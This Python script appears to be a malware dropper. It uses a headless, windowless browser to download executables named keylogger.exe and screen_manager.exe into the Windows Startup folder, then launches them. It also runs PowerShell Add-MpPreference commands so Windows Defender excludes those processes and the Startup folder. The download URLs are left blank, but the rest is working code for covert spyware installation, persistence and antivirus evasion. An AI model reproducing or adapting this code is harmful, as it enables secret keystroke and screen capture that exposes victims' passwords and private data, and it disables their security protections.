
from selenium import webdriver
from subprocess import CREATE_NO_WINDOW
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service as cs
from selenium.webdriver.firefox.service import Service as fs
from selenium.webdriver.edge.service import Service as es
from selenium.webdriver.chrome.options import Options as co
from selenium.webdriver.firefox.options import Options as fo
from selenium.webdriver.edge.options import Options as eo
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.firefox import GeckoDriverManager
from webdriver_manager.microsoft import EdgeChromiumDriverManager
import time, os

def get_download_folder(user_folder):
    download_folder = user_folder + r"\Downloads"
    if not os.path.exists(download_folder):
        download_folder = user_folder + r"\OneDrive\Downloads"
    return download_folder

def get_service(drivers_list):
    for browser in drivers_list:
        try:
            driver_service = eval(drivers_list[browser])
        except:
            pass
        else:
            return driver_service, browser
        
def get_option(browser, options_list):
    for browser_name in options_list:
        if browser_name == browser:
            return eval(options_list[browser_name])

def execute_program_from(path_list):
    for file_path in path_list:
        file = os.path.split(file_path)
        os.chdir(file[0])
        os.system("start " + file[1])
        time.sleep(1)

def add_process_exclusion(file_names):
    for file_name in file_names:
        os.system("powershell -Command Add-MpPreference -ExclusionProcess " + file_name)

def download(file_folder_path, file_name, url, download_folder):
    global total_downloads
    drivers_list = {"chrome" : "cs(ChromeDriverManager().install())",
                "firefox" : "fs(GeckoDriverManager().install())",
                "edge" : "es(EdgeChromiumDriverManager().install())"}
    options_list = {"chrome" : "co()", "firefox": "fo()", "edge": "eo()"}
    if not os.path.exists(file_folder_path):
        try:
            driver_service, browser = get_service(drivers_list)
            driver_service.creationflags = CREATE_NO_WINDOW
            driver_options = get_option(browser, options_list)
            driver_options.add_argument("headless")
            driver_options.add_argument('window-size=1920x1080')          
            driver = eval("webdriver." + browser.title() + "(service = driver_service, options = driver_options)")
            params = {'behavior' : 'allow', 'downloadPath' : download_folder}
            driver.execute_cdp_cmd('Page.setDownloadBehavior', params)     
            driver.get(url)
            time.sleep(5)
            #THIS IS JUST AN EXAMPLE:
            #look for your download button
            driver.find_element(By.CLASS_NAME, "").click()
            file_downloaded_path = download_folder + file_name
            while not os.path.exists(file_downloaded_path):
                time.sleep(1)
            driver.close()
        except:
            pass
        else:
            os.system('move ' + '"' + file_downloaded_path + '" ' + '"' + file_folder_path + '"')
            total_downloads += 1

user_folder = os.path.expanduser("~")
download_folder = get_download_folder(user_folder)
startup_folder = user_folder + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

keyboard_manager_folder = startup_folder + r"\keylogger.exe"
keyboard_manager_url = "" # url keylogger

screen_manager_folder = startup_folder + r"\screen_manager.exe"
screen_manager_url = "" # url screen_manager

total_downloads = 0

download(keyboard_manager_folder, '\\keylogger.exe', keyboard_manager_url, download_folder)
download(screen_manager_folder, '\\screen_manager.exe', screen_manager_url, download_folder)

time.sleep(1)

if total_downloads == 2:
    execute_program_from([keyboard_manager_folder, screen_manager_folder])
    add_process_exclusion(["keylogger.exe", "screen_manager.exe"])
    os.system("powershell -Command Add-MpPreference -ExclusionPath " + "'" + startup_folder + "'")

time.sleep(5)
